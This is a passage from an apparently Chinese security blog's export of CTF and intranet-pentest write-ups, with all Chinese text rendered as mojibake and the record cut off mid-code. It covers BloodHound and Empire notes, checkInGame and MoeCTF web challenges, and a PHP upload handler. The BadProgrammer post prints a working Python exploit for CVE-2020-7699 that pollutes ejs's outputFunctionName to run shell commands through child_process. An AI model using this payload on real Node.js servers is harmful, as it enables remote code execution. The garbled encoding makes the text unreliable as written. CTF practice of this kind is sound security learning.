BloodHoundé€šè¿‡å›¾ä¸çº¿çš„å½¢å¼ï¼Œå°†åŸŸå†…ç”¨æˆ·ã€è®¡ç®—æœºã€åŠç›¸å…³ç”¨æˆ·ç­‰ç­‰ä¹‹é—´çš„å…³ç³»ç›´è§‚åœ°å±•ç°åœ¨Red Teamé˜Ÿå‘˜é¢å‰ï¼Œå¸®åŠ©æ›´å¿«çš„æ¢³ç†åŸŸå†…çš„æƒ…å†µã€‚(è¿™é‡Œå…ˆåšäº†è§£) BloodHoundåŸºäºNeo4j(éå…³ç³»å‹æ•°æ®åº“) é…ç½® å®‰è£…java å®‰è£…Neo4jServer Community https://neo4j.com/download-center/#community å¼€å¯æœåŠ¡ neo4j.bat console è¿™é‡Œå‘ç°æœ‰ç‚¹é—®é¢˜ï¼Œå°±å…ˆæ”¾å¼ƒäº†ã€‚ç•™ä¸ªæ ‡è®°ç­‰æ—¥åéœ€è¦æ‹¾èµ·- . - åŸŸåˆ†æå·¥å…·BloodHoundä½¿ç”¨æ•™ç¨‹ 3.42 ä½¿ç”¨empireæ”¶é›†ä¿¡æ¯ åœ¨æ”»å‡»æœºä¸Šå®‰è£…empireåï¼Œä½¿ç”¨usemodule powershell/situational_awareness/host/winenumå³å¯æ”¶é›†ç›¸å…³ä¿¡æ¯ï¼Œæ³¨æ„ä½¿ç”¨è¯¥æ¨¡å—éœ€è¦æ‹¿åˆ°ç®¡ç†å‘˜æƒé™ å››ã€å‚è€ƒæ–‡ç« ï¼š å†…ç½‘æ¸—é€-ä¿¡æ¯æ”¶é›†ç¯‡ å†…ç½‘æ¸—é€åˆè¯†â€”ä¿¡æ¯æ”¶é›†1 å†…ç½‘æ¸—é€åˆè¯†â€”ä¿¡æ¯æ”¶é›†2","tags":["å†…ç½‘æ¸—é€"],"categories":["å†…ç½‘æ¸—é€"]},{"title":"æ”»é˜²ä¸–ç•Œ-BadProgrammer","path":"/2023/09/02/badprogrammer/","content":"é¢˜ç›®æè¿°ï¼š æˆ‘æ˜¯ä¸€ä¸ªç¨‹åºå‘˜ï¼Œæˆ‘ä»€ä¹ˆä¹Ÿä¸ä¼šã€‚ é¢˜ç›®è§£é¢˜ï¼š çœ‹ä¸€ä¸‹é¡µé¢ï¼Œæœ‰å‡ ä¸ªå¯ç‚¹å‡»çš„æŒ‰é’®ï¼Œä¸è¿‡æ²¡ä»€ä¹ˆååº”ï¼ŒæŸ¥çœ‹æºä»£ç ä¹Ÿæ²¡å‘ç°å¯ç–‘ç‚¹ã€‚äºæ˜¯ç”¨dirsearchæ‰«äº†ä¸€ä¸‹ï¼Œå‘ç°url/staticâ€¦/çœ‹åˆ°äº†ç›®å½• ç‚¹å¼€å‡ ä¸ªçœ‹äº†çœ‹ï¼Œå‘ç°å‡ ä¸ªå¯ç–‘æ–‡ä»¶ flag.ejs &lt;html&gt; &lt;head&gt; &lt;title&gt;flag?&lt;/title&gt; &lt;/head&gt; &lt;body&gt; No No No, flag is in `flag.txt`. &lt;/body&gt; &lt;/html&gt; app.js const express = require('express'); const fileUpload = require('express-fileupload'); const app = express(); app.use(fileUpload({ parseNested: true })); app.post('/4_pATh_y0u_CaNN07_Gu3ss', (req, res) =&gt; { res.render('flag.ejs'); }); app.get('/', (req, res) =&gt; { res.render('index.ejs'); }) app.listen(3000); app.on('listening', function() { console.log('Express server started on port %s at %s', server.address().port, server.address().address); }); åœ¨appä¸­å‘ç°ï¼Œè¿™æ˜¯ä¸€ä¸ªexpressæ¡†æ¶ï¼Œä½†ä¸çŸ¥é“æ˜¯æ˜¯ä»€ä¹ˆæ¼æ´ï¼Œå¯èƒ½æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œäºæ˜¯å€Ÿé‰´äº†wpå‘ç°äº†åŸå‹é“¾æ±¡æŸ“ åŸå‹é“¾æ±¡æŸ“æ¼æ´ æŸ¥çœ‹package.jsonæ–‡ä»¶ï¼Œå‘ç°å¼•ç”¨express-fileuploadç‰ˆæœ¬ä¸º1.1.7-alpha.4ï¼Œæ­¤ç‰ˆæœ¬å­˜åœ¨CVE-2020-7699ï¼ŒåŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚ CVE-2020-7699ï¼šNodeJSæ¨¡å—ä»£ç æ³¨å…¥ è¯¥æ¼æ´å®Œå…¨æ˜¯ç”±äºNodejsçš„express-fileuploadæ¨¡å—å¼•èµ·ï¼Œè¯¥æ¨¡å—çš„1.1.8ä¹‹å‰çš„ç‰ˆæœ¬å­˜åœ¨åŸå‹é“¾æ±¡æŸ“ï¼ˆPrototype Pollutionï¼‰æ¼æ´ï¼Œå½“ç„¶ï¼Œå¼•å‘è¯¥æ¼æ´ï¼Œéœ€è¦ä¸€å®šçš„é…ç½®ï¼šparseNestedé€‰é¡¹è®¾ç½®ä¸ºtrue è¯¥æ¼æ´å¯ä»¥å¼•å‘DOSæ‹’ç»æœåŠ¡æ”»å‡»ï¼Œé…åˆejsæ¨¡æ¿å¼•æ“ï¼Œå¯ä»¥è¾¾åˆ°RCEçš„ç›®çš„ é€šè¿‡æ±¡æŸ“ejsä¸­outputFunctionNameå˜é‡ï¼Œå®ç°RCEï¼š import requests resp1 = requests.post(\"http://{}:{}/{}\".format('61.147.171.105', '62577', '4_pATh_y0u_CaNN07_Gu3ss'), files={'__proto__.outputFunctionName': ( None, \"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x\".format(cmd='cp /flag.txt /app/static/js/flag.txt') )}) print(resp1) è®¿é—®ï¼Œå³å¯å¾—åˆ° flag http://ip/static/js/flag.txt å…·ä½“å¤ç°å°±åœ¨æ¼æ´åº“è¿›è¡Œäº† å‚è€ƒæ–‡ç« ï¼š ã€æ„šå…¬ç³»åˆ—ã€‘2023å¹´06æœˆ æ”»é˜²ä¸–ç•Œ-Webï¼ˆBadProgrammerï¼‰","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-checkInGame","path":"/2023/09/02/checkingame/","content":"é¢˜ç›®æè¿°ï¼š checkInGame é¢˜ç›®è§£é¢˜ï¼š æ‰“å¼€é¢˜ç›®æ²¡å•¥ä¿¡æ¯ï¼Œé‚£çœ‹ä¸€ä¸‹æºç ï¼Œå‘ç°æœ‰ä¸¤ä¸ªè¢«æ³¨é‡Šæ‰çš„æŒ‰é’®ï¼Œè¿™é‡Œæˆ‘ä¹Ÿä¸çŸ¥é“å¦‚ä½•åˆ©ç”¨ã€‚ éšådirsearchæ‰«äº†ä¸€ä¸‹ç½‘ç«™ï¼Œæ²¡å•¥ç»“æœï¼Œè¿™é‡Œä¹Ÿå°±æ²¡æ€è·¯äº†ï¼Œäºæ˜¯å€Ÿé‰´wpå§ã€‚ çœ‹äº†wpå‘ç°æ˜¯é¢˜ç›®ç¯å¢ƒçš„é—®é¢˜ï¼Œæˆ‘è¿™é‡Œæ˜¾ç¤ºçš„éƒ½æ˜¯æ— æƒé™è®¿é—®jsç›¸å…³æ–‡ä»¶ï¼Œè€Œä½¬çš„ç¯å¢ƒæ˜¯æ­£å¸¸çš„ã€‚ä½† æ—¢ç„¶ç¢°åˆ°äº†ï¼Œå’±ä»¬å°±è·Ÿç€wpèµ°ä¸€éä¹Ÿå¯ã€‚ æœ¬é¢˜æ˜¯ä¸ªjsæ¸¸æˆï¼Œå› ä¸ºæ˜¯å‰ç«¯é¡µé¢ï¼Œæ˜¯ä½¿ç”¨jsæ¥å®ç°çš„ï¼Œé‚£ä»£ç æˆ‘ä»¬å¯ä»¥æ§åˆ¶ï¼Œè€Œä¸”å¯ä»¥è°ƒè¯•ã€‚ æ–¹æ³•ä¸€ï¼š burpsuiteæŠ“åŒ…ï¼Œburpsuiteä¸å¯¹åŒ…è¿›è¡Œå¤„ç†ã€‚ç„¶ååœ¨æµè§ˆå™¨ä¸­åšæ¸¸æˆï¼Œç­‰åˆ°40ç§’è¿‡å®Œæ—¶ï¼Œç‚¹å‡»ç¡®å®šï¼Œé¡µé¢ä¸ä¼šåˆ·æ–°ï¼Œå¯ä»¥ç»§ç»­åšï¼Œç›´åˆ°è§£å‡ºflagã€‚ æ–¹æ³•äºŒï¼š è®¿é—®http://IP:POTRT/ï¼Œç‚¹å‡»F12ï¼ŒæŸ¥çœ‹jsä»£ç ã€‚ å‘ç°view.jsåˆå§‹åŒ–å‡½æ•°ä¸­æœ‰updateTimeçš„å±æ€§ï¼ŒçŒœæµ‹æ˜¯è¿™ä¸ªå±æ€§åšäº†å€’è®¡æ—¶ã€‚ åœ¨game.jsä¸­è°ƒç”¨äº†è¿™ä¸ªå±æ€§ã€‚ ä¸‹è½½æºç åˆ†æè°ƒè¯• ctrl+sä¸‹è½½æºç  ä¿®æ”¹jsæ–‡ä»¶åç¼€ï¼Œå³åˆ é™¤.ä¸‹è½½ ä¿®æ”¹è¿è¿çœ‹.htmlä¸­çš„jsæ–‡ä»¶åç¼€ï¼Œå³åˆ é™¤.ä¸‹è½½ æ‰“å¼€è¿è¿çœ‹.html,åå‘ç°å›¾ç‰‡æ²¡æœ‰æ­£å¸¸æ˜¾ç¤ºï¼ŒæŸ¥çœ‹å…ƒç´ åï¼Œå‘ç°å›¾ç‰‡åº”è¯¥æ”¾åœ¨è¿è¿çœ‹.htmlåŒç›®å½•ä¸‹imgæ–‡ä»¶ä¸­ã€‚ å†æ¬¡æ‰“å¼€è¿è¿çœ‹.htmlï¼Œå›¾ç‰‡åŠ è½½ã€‚ ä¿®æ”¹game.jsæ–‡ä»¶ï¼Œæ³¨é‡Šæ‰this['updateTime'](); è¿™æ®µä»£ç ï¼Œæˆ–åˆ é™¤æ‰è¿™æ®µä»£ç  å¯ä»¥çœ‹åˆ°å€’è®¡æ—¶åœåœ¨40ç§’ã€‚ åšå®Œè¿è¿çœ‹è·å–flagã€‚ å¾—åˆ°flagï¼šflag{98fa8c29-5b70-5f30-36e4-ad006b259686} å‚è€ƒæ–‡ç« ï¼š ã€æ„šå…¬ç³»åˆ—ã€‘2023å¹´06æœˆ æ”»é˜²ä¸–ç•Œ-Webï¼ˆcheckInGameï¼‰ ä½†è¿™ä¸ªæ–‡ç« åªæœ‰ä¸€ä¸ªæ–¹æ³•ï¼Œå¤§å®¶å¯ä»¥å‚è€ƒæ”»é˜²ä¸–ç•Œçš„wp","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"MoeCTF 2023 - æŒç»­æ›´æ–°","path":"/2023/08/30/moectf-2023-wp/","content":"å‰è¨€ è¿™æ¬¡æ˜¯éš”äº†å‡ ä¸ªæ˜ŸæœŸåˆæ¥çœ‹äº†çœ‹ï¼Œæ‰¾äº†æ‰¾ç½‘ä¸Šæ˜¯å¦æœ‰wpï¼Œæœç„¶æœ‰äº†ï¼Œå¯¹äºæˆ‘è¿™ç§èœé¸¡â”­â”®ï¹â”­â”®è¿˜æ˜¯å¾—è€ƒwpåº¦æ—¥ï¼Œå› æ­¤æˆ‘ä»¬æ¥æµ…æµ…å¤ç°ä¸€æ³¢ï¼Œå°†webæ²¡åšå‡ºæ¥çš„åšä¸€ä¸‹ã€‚ ç­¾åˆ° hello CTFer è¿™é‡Œæˆ‘æ˜¯æ ¡å¤–ç”¨æˆ·ï¼š https://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&amp;input=Ylc5bFkzUm1lMWRsTVdOdmJUTmZkREJmYlRCbFkzUm1Yekp2TWpNaElTRjk å°†è¿™ä¸€æ®µYlc5bFkzUm1lMWRsTVdOdmJUTmZkREJmYlRCbFkzUm1Yekp2TWpNaElTRjk\tè¿›è¡Œ2æ¬¡base64è§£å¯†å³å¯ ![image-20230830095146518](MoeCTF 2023-wp/image-20230830095146518.png) Web http ![image-20230830095314701](MoeCTF 2023-wp/image-20230830095314701.png) ç®€å•çš„å‚æ•°è®¾ç½®ï¼Œgetä¼ å‚?UwU=uï¼Œpostä¼ Luv=uï¼Œä¿®æ”¹character=adminï¼Œä¿®æ”¹xffå¤´ä¸º127.0.0.1ï¼Œä¿®æ”¹uaå¤´ä¸ºMoeBrowserå³å¯ ![image-20230830095702379](MoeCTF 2023-wp/image-20230830095702379.png) ![image-20230830095709297](MoeCTF 2023-wp/image-20230830095709297.png) ![image-20230830095713975](MoeCTF 2023-wp/image-20230830095713975.png) ![image-20230830095718032](MoeCTF 2023-wp/image-20230830095718032.png) Webå…¥é—¨æŒ‡åŒ— ![image-20230830095841779](MoeCTF 2023-wp/image-20230830095841779.png) ç®€å•è§£å¯†ï¼Œåšé¢˜å¤šäº†å°±ä¼šè®¤ä¸ºè¿™æ˜¯16è¿›åˆ¶è½¬å­—ç¬¦ä¸²è§£å¯†ï¼Œéšåå†base64è§£å¯†å³å¯ ![image-20230830100024678](MoeCTF 2023-wp/image-20230830100024678.png) ![image-20230830100039939](MoeCTF 2023-wp/image-20230830100039939.png) å½¼å²¸çš„flag ![image-20230830100141555](MoeCTF 2023-wp/image-20230830100141555.png) ç¿»äº†ç¿»èŠå¤©è®°å½•ï¼Œæ²¡å•¥ä¿¡æ¯ï¼Œé‚£å°±çœ‹ä¸€ä¸‹æºä»£ç  ![image-20230830100204533](MoeCTF 2023-wp/image-20230830100204533.png) æˆåŠŸæ‰¾åˆ°flag cookie å…ˆçœ‹çœ‹é™„ä»¶ç»™äº†ä»€ä¹ˆ ![image-20230830100606413](MoeCTF 2023-wp/image-20230830100606413-1693361166984-1.png) è¿™æ˜¯ç«Ÿç„¶ç›´æ¥ç»™äº†å¦‚ä½•è·å–flagï¼Œä¸è¿‡è‚¯å®šæ²¡é‚£ä¹ˆç®€å•ï¼Œæˆ‘ä»¬å…ˆè¯•è¯• ![image-20230830100638898](MoeCTF 2023-wp/image-20230830100638898-1693361199190-3.png) æœç„¶æ˜¯é”™çš„ï¼Œé‚£æˆ‘ä»¬å…ˆæ³¨å†Œçœ‹çœ‹ ![image-20230830100944770](MoeCTF 2023-wp/image-20230830100944770.png) åœ¨ç™»å½•ä¸€ä¸‹ ![image-20230830101028269](MoeCTF 2023-wp/image-20230830101028269.png) è¿™é‡Œå‘ç°å‡ºç°ä¸ªtokenï¼Œé‚£éš¾é“æ˜¯å‚ç›´è¶Šæƒï¼Ÿä¸ç®¡æ€æ ·ï¼Œå…ˆè§£ç ä¸€ä¸‹ ![image-20230830101057502](MoeCTF 2023-wp/image-20230830101057502.png) é‚£å¤§æ¦‚ç‡å°±æ˜¯ä¿®æ”¹roleä¸ºadminå»è®¿é—®flagï¼Œè¿™æ ·æ‰æ»¡è¶³rootæƒé™ é‚£æˆ‘ä»¬å»è®¿é—®flagå¹¶ä¸”ä¿®æ”¹token ![image-20230830102741721](MoeCTF 2023-wp/image-20230830102741721.png) ![image-20230830102735480](MoeCTF 2023-wp/image-20230830102735480.png) å¾—åˆ°flag gas!gas!gas! ![image-20230830103144086](MoeCTF 2023-wp/image-20230830103144086.png) æ‰“å¼€é¡µé¢ï¼Œæ²¡å’‹çœ‹æ‡‚ï¼ŒæŸ¥çœ‹æºä»£ç ä¹Ÿæ²¡ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬éšä¾¿æäº¤å‡ ä¸‹ï¼Œçœ‹çœ‹é¡µé¢çš„ä¿¡æ¯ ![image-20230830103220275](MoeCTF 2023-wp/image-20230830103220275.png) è¯´idå¯èƒ½ä¼šå¸®åŠ©ä½ å®šä½ä¿¡æ¯ã€‚ è¿™é‡Œæˆ‘ä¸€ç›´ä»¥ä¸ºè¦ç”¨è„šæœ¬çš„ï¼Œå› ä¸ºæˆ‘å¤ªèœä¸ä¼šå†™å°±æ²¡æ€è·¯äº†ï¼Œç„¶åçœ‹äº†wpå‘ç°è¿™é¢˜è„šæœ¬ä¼¼ä¹çœŸä¸è¡Œï¼Œä»–çš„å›ç­”æ˜¯ï¼š èµ·åˆæˆ‘ç”¨äº†pythonè„šæœ¬å°è¯•ï¼Œä½†æ˜¯å¾ˆé—æ†¾ï¼Œrequestsæ˜¯ä¸ªåŒæ­¥è„šæœ¬ï¼Œæˆ‘çš„ç½‘ç»œç¯å¢ƒè¾¾ä¸åˆ°0.5ç§’å†…ç»™å‡ºå“åº”ï¼Œå¼‚æ­¥è„šæœ¬åˆ™å¯èƒ½ä¼šå‘é€é”™è¯¯çš„postè¯·æ±‚ï¼Œå¯¼è‡´é‡æ–°å¼€å§‹ã€‚ æ‰€ä»¥è¿™é“é¢˜å¯ä»¥ä½¿ç”¨è‡ªåŠ¨åŒ–æµ‹è¯•è„šæœ¬æ¥å®Œæˆï¼Œæœ¬æ¥æƒ³å†™æ²¹çŒ´çš„è„šæœ¬ï¼Œä½†æ˜¯ä¹Ÿæ¯”è¾ƒéº»çƒ¦ï¼Œæ‰€ä»¥å°±é€‰æ‹©äº†selenium. ä¸è¿‡ï¼Œå®ƒéœ€è¦å®‰è£…æ‰©å±•å’Œä¸‹è½½é©±åŠ¨ï¼šhttps://googlechromelabs.github.io/chrome-for-testing/#stable æ ¹æ®è‡ªå·±æµè§ˆå™¨ç‰ˆæœ¬ä¸‹è½½å³å¯ã€‚ è¿™é‡Œè¿˜æ‡µäº†ä¸€ä¼šå„¿ï¼Œæ²¹çŒ´è„šæœ¬æ˜¯å•¥ï¼Œæœäº†æœå‘ç°æ˜¯ä¸€ä¸ªå¼€æºçš„é›†ä¼—å¤šå¤§ç¥è„šæœ¬äºä¸€èµ·çš„æ’ä»¶å·¥å…·ï¼Œè„šæœ¬å¼ºå¤§è€Œå®ç”¨ï¼Œè¿™é‡Œä¹Ÿæ²¡æ·±å…¥äº†è§£ï¼Œåªæ˜¯æäº†ä¸€ä¸‹é‚£ä¸ªç™¾åº¦ç½‘ç›˜åŠ é€Ÿçš„äº‹æƒ…ã€‚å¥½å›å½’é¢˜ç›®ï¼Œè¿™é‡Œä¹Ÿæ˜¯åºŸäº†åŠå¤©æ—¶é—´æå¥½äº†ä»–çš„è„šæœ¬ï¼Œæƒ³åˆ°ä¹‹å‰æ²¡æ€ä¹ˆå¥½å¥½å­¦ä¹ è„šæœ¬ï¼Œä»Šæ¬¡å¼€å§‹ å¾—å­¦ç€å†™è„šæœ¬äº†ã€‚è„šæœ¬å¦‚ä¸‹ï¼š import time from selenium import webdriver from selenium.webdriver.chrome.service import Service from selenium.webdriver.common.by import By #ä»¥ä¸Šä¸¤è¡Œç”¨äºæ§åˆ¶webæµè§ˆå™¨ from lxml import etree #ç”¨äºè§£æHTMLå†…å®¹ã€‚ s = Service(\"chromedriver.exe\") #ä½¿ç”¨ChromeDriverï¼ˆchromedriver.exeï¼‰è®¾ç½®Selenium WebDriver driver = webdriver.Chrome(service=s) driver.get('http://localhost:53153/') #å¯åŠ¨webæµè§ˆå™¨å¹¶è®¿é—®è¯¥url,ä»¥ä¾¿åç»­çš„äº¤äº’ input_box = driver.find_element(By.XPATH,'//*[@id=\"driver\"]') #é€šè¿‡xpathè¯­æ³•æŸ¥æ‰¾ htmlä¸­çš„id=dirverçš„å…ƒç´  input_box.send_keys('1')#å°†æ–‡æœ¬å­—ç¬¦ä¸²'1'è¾“å…¥åˆ°åä¸ºinput_boxçš„è¾“å…¥æ¡†ä¸­ã€‚è¿™æ¨¡æ‹Ÿäº†åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥æ•°æ®çš„ç”¨æˆ·æ“ä½œã€‚ sub = driver.find_element(By.XPATH,'//input[@type=\"submit\"]') sub.submit()#ä¸Šé¢ä¸¤å¥ç›¸äº’é…åˆï¼Œå…ˆæ‰¾åˆ°submitæäº¤æŒ‰é’®ï¼Œç„¶åç‚¹å‡»æäº¤ time.sleep(0.2) #è®¾ç½®0.2ç§’å»¶è¿Ÿ for index in range(2,10): print(f\"å½“å‰é£˜äº† {index} æ¬¡\") time.sleep(0.2) #driver.page_sourceç”¨äºè·å–å½“å‰é¡µé¢çš„HTMLæºä»£ç ï¼Œç„¶åä½¿ç”¨etree.HTMLå’Œlxmlåº“å°†å…¶è§£æä¸ºå¯ä¾›è„šæœ¬è¿›ä¸€æ­¥å¤„ç†çš„ç»“æ„åŒ–æ•°æ®ã€‚ html = etree.HTML(driver.page_source) d = '' try: d = html.xpath('//h3/font/text()')[0] #è¿™é‡Œå°è¯•ä»fontå­å…ƒç´ çš„h3å…ƒç´ æå–æ–‡æœ¬ï¼Œä¹Ÿå°±æ˜¯ä¸ºäº†è·å–é¡µé¢å½“å‰è½¦æ‰‹ä¿¡æ¯ except:#ä»¥ä¸‹æ˜¯æ‰¾flagçš„è¯­å¥ flag = html.xpath('//*[@id=\"info\"]/text()[3]')[0] print(flag) time.sleep(10) driver.close() print(\"å½“å‰çŠ¶æ€:\",d) if \"å¼¯é“å‘å·¦\" in d: driver.find_element(By.XPATH,'//*[@id=\"steering_control\"]/option[3]').click(); print('å‘å³',end='|') elif \"å¼¯é“ç›´è¡Œ\" in d: driver.find_element(By.XPATH, '//*[@id=\"steering_control\"]/option[2]').click(); print('ç›´è¡Œ',end='|') elif \"å¼¯é“å‘å³\" in d: driver.find_element(By.XPATH, '//*[@id=\"steering_control\"]/option[1]').click(); print('å‘å·¦',end='|') if \"æŠ“åœ°åŠ›å¤ªå°\" in d: driver.find_element(By.XPATH, '//*[@id=\"throttle\"]/option[1]').click(); print('æ¾å¼€') elif \"ä¿æŒè¿™ä¸ªé€Ÿåº¦\" in d: driver.find_element(By.XPATH, '//*[@id=\"throttle\"]/option[2]').click(); print('ä¿æŒ') elif \"æŠ“åœ°åŠ›å¤ªå¤§\" in d: driver.find_element(By.XPATH, '//*[@id=\"throttle\"]/option[3]').click(); print('å…¨å¼€') sub = driver.find_element(By.XPATH, '//input[@type=\"submit\"]') sub.submit()#ä»¥ä¸Šåˆ™æ˜¯åˆ¤æ–­å½“å‰è½¦çš„çŠ¶å†µè€Œåšå‡ºæ”¹å˜ æˆ‘ä»¬é¦–å…ˆå…ˆçœ‹æ‡‚ä»£ç å†™çš„æ€è·¯ï¼Œä»¥ä¸‹æ˜¯GPTå›ç­” è¿™ä¸ªPythonè„šæœ¬ä½¿ç”¨Seleniumåº“è‡ªåŠ¨åŒ–ä¸ä¸€ä¸ªè¿è¡Œåœ¨æœ¬åœ°æœåŠ¡å™¨ä¸Šçš„ç½‘é¡µï¼ˆhttp://localhost:53153/ï¼‰è¿›è¡Œäº¤äº’ã€‚è„šæœ¬æ¨¡æ‹Ÿäº†ä¸€ç§æ ¹æ®ä»ç½‘é¡µä¸­æå–çš„ä¿¡æ¯æ¥æ§åˆ¶æ–¹å‘ç›˜å’Œæ²¹é—¨çš„è¡Œä¸ºã€‚ä»¥ä¸‹æ˜¯è„šæœ¬åŠŸèƒ½çš„è¯¦ç»†è§£é‡Šï¼š 1. å¯¼å…¥å¿…è¦çš„æ¨¡å—ï¼š - `time`ï¼šç”¨äºåœ¨è„šæœ¬ä¸­å¼•å…¥å»¶è¿Ÿã€‚ - `webdriver` å’Œç›¸å…³çš„ `selenium` ç»„ä»¶ï¼šç”¨äºæ§åˆ¶Webæµè§ˆå™¨ã€‚ - ä» `lxml` å¯¼å…¥çš„ `etree`ï¼šç”¨äºè§£æHTMLå†…å®¹ã€‚ 2. ä½¿ç”¨ChromeDriverï¼ˆ`chromedriver.exe`ï¼‰è®¾ç½®Selenium WebDriverã€‚ 3. å¯¼èˆªåˆ°ç½‘é¡µ 'http://localhost:53153/'ã€‚ 4. ä½¿ç”¨XPathè¡¨è¾¾å¼æ‰¾åˆ°ç½‘é¡µä¸Šçš„è¾“å…¥æ¡†å¹¶å‘å…¶å‘é€å€¼ '1'ã€‚ 5. æ‰¾åˆ°å¹¶æäº¤ç½‘é¡µä¸Šçš„è¡¨å•ã€‚ 6. è¿›å…¥ä¸€ä¸ªå¾ªç¯ï¼Œä» `2` åˆ° `9`ï¼ˆåŒ…æ‹¬ï¼‰çš„è¿­ä»£ä¸­æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š - æ‰“å°å½“å‰è¿­ä»£æ¬¡æ•°ã€‚ - å¼•å…¥0.2ç§’çš„å»¶è¿Ÿã€‚ - ä½¿ç”¨ `lxml` è§£æå½“å‰é¡µé¢çš„HTMLå†…å®¹ã€‚ - å°è¯•ä»ä¸€ä¸ªå…·æœ‰ `font` å­å…ƒç´ çš„ `h3` å…ƒç´ ä¸­æå–æ–‡æœ¬ã€‚å¦‚æœæˆåŠŸï¼Œå°†å…¶èµ‹ç»™å˜é‡ `d`ã€‚å¦‚æœå¤±è´¥ï¼Œæ•è·å¼‚å¸¸ï¼Œæ‰“å°ä¸€æ¡æ¶ˆæ¯ï¼Œç­‰å¾…10ç§’åå…³é—­WebDriverå¹¶ç»ˆæ­¢è„šæœ¬ã€‚ - æ‰“å°ä» `d` ä¸­æå–çš„å½“å‰çŠ¶æ€ã€‚ 7. æ ¹æ® `d` çš„å€¼ï¼Œè„šæœ¬ä¸ç½‘é¡µè¿›è¡Œäº¤äº’ï¼š - å¦‚æœ `d` ä¸­åŒ…å« \"å¼¯é“å‘å·¦\"ï¼Œåˆ™é€‰æ‹©å‘å³è½¬çš„é€‰é¡¹ã€‚ - å¦‚æœ `d` ä¸­åŒ…å« \"å¼¯é“ç›´è¡Œ\"ï¼Œåˆ™é€‰æ‹©ç›´è¡Œçš„é€‰é¡¹ã€‚ - å¦‚æœ `d` ä¸­åŒ…å« \"å¼¯é“å‘å³\"ï¼Œåˆ™é€‰æ‹©å‘å·¦è½¬çš„é€‰é¡¹ã€‚ - å¦‚æœ `d` ä¸­åŒ…å« \"æŠ“åœ°åŠ›å¤ªå°\"ï¼Œåˆ™é€‰æ‹©é‡Šæ”¾æ²¹é—¨çš„é€‰é¡¹ã€‚ - å¦‚æœ `d` ä¸­åŒ…å« \"ä¿æŒè¿™ä¸ªé€Ÿåº¦\"ï¼Œåˆ™é€‰æ‹©ä¿æŒå½“å‰é€Ÿåº¦çš„é€‰é¡¹ã€‚ - å¦‚æœ `d` ä¸­åŒ…å« \"æŠ“åœ°åŠ›å¤ªå¤§\"ï¼Œåˆ™é€‰æ‹©å…¨é€Ÿå‰è¿›çš„é€‰é¡¹ã€‚ 8. åœ¨æ ¹æ® `d` åšå‡ºå¿…è¦é€‰æ‹©åï¼Œå†æ¬¡æŸ¥æ‰¾å¹¶æäº¤è¡¨å•ã€‚ è¿™ä¸ªè„šæœ¬ä¼¼ä¹æ˜¯ä¸€ä¸ªåŸºæœ¬çš„ç½‘é¡µè‡ªåŠ¨åŒ–ç¤ºä¾‹ï¼Œç”¨äºæ§åˆ¶ä¸€ä¸ªæ¨¡æ‹Ÿè½¦è¾†çš„æ–¹å‘ç›˜å’Œæ²¹é—¨ã€‚è„šæœ¬å®šæœŸæ£€æŸ¥çŠ¶æ€å¹¶æ ¹æ®éœ€è¦åšå‡ºå“åº”ã€‚ç„¶è€Œï¼Œæä¾›çš„ä»£ç ä¸­æœªè¯¦ç»†è¯´æ˜è¢«æ§åˆ¶çš„ç½‘é¡µçš„å…·ä½“åŠŸèƒ½å’Œè¡Œä¸ºï¼Œè„šæœ¬å¯èƒ½éœ€è¦æ ¹æ®å®é™…ç½‘é¡µçš„ç»“æ„å’Œè¡Œä¸ºè¿›è¡Œè°ƒæ•´ã€‚æ­¤å¤–ï¼Œç¡®ä¿ç½‘é¡µçš„ç»“æ„å’Œå…ƒç´ ä¿æŒä¸€è‡´ï¼Œä»¥ä½¿è„šæœ¬èƒ½å¤Ÿç¨³å®šå¯é åœ°å·¥ä½œæ˜¯å¾ˆé‡è¦çš„ã€‚ å¥½ï¼Œè„šæœ¬å¯ä»¥çœ‹æ‡‚äº†ï¼Œä½†æˆ‘è¿˜æ˜¯ä¸ä¼šå†™å•Š-.-ï¼Œè¿™é‡Œåº“çš„ç”¨æ³•å°±æ²¡å­¦ï¼Œçœ‹æ¥æœ‰æ—¶é—´å¾—å­¦å­¦åº“äº†ã€‚ ![image-20230930194220177](MoeCTF 2023-wp/image-20230930194220177.png) è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯è¦å°†è„šæœ¬æ”¾åˆ°ä¸è‡ªå·±ä¸‹è½½çš„chromedriveråŒä¸€ç›®å½•ä¸‹è¿è¡Œ moeå›¾åºŠ ![image-20230830105737987](MoeCTF 2023-wp/image-20230830105737987.png) æ‰“å¼€æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œè¿™é‡Œå…ˆçœ‹ä¸€ä¸‹æºä»£ç  ![image-20230830105801041](MoeCTF 2023-wp/image-20230830105801041.png) å‘ç°æœ‰ä¸ªupload.phpé¡µé¢ï¼Œè®¿é—®çœ‹çœ‹ï¼Œè¿›è¡Œä»£ç å®¡è®¡ &lt;?php $targetDir = 'uploads/'; $allowedExtensions = ['png']; if ($_SERVER['REQUEST_METHOD'] === 'POST' &amp;&amp; isset($_FILES['file'])) { $file = $_FILES['file']; $tmp_path = $_FILES['file']['tmp_name']; if ($file['type'] !== 'image/png') { die(json_encode(['success' =&gt; false, 'message' =&gt; 'æ–‡ä»¶ç±»å‹ä¸ç¬¦åˆè¦æ±‚'])); } if (filesize($tmp_path) &gt; 512 * 1024) { die(json_encode(['success' =&gt; false, 'message' =&gt; 'æ–‡ä»¶å¤ªå¤§'])); } $fileName = $file['name']; $fileNameParts = explode('.', $fileName); if (count($fileNameParts) &gt;= 2) { $secondSegment = $fileNameParts[1]; if ($secondSegment !== 'png') { die(json_encode(['success' =&gt; false, 'message' =&gt; 'æ–‡ä»¶åç¼€ä¸ç¬¦åˆè¦æ±‚'])); } } else { die(json_encode(['success' =&gt; false, 'message' =&gt; 'æ–‡ä»¶åç¼€ä¸ç¬¦åˆè¦æ±‚'])); } $uploadFilePath = dirname(__FILE__) . '/' . $targetDir . basename($file['name']); if (move_uploaded_file($tmp_path, $uploadFilePath)) { die(json_encode(['success' =&gt; true, 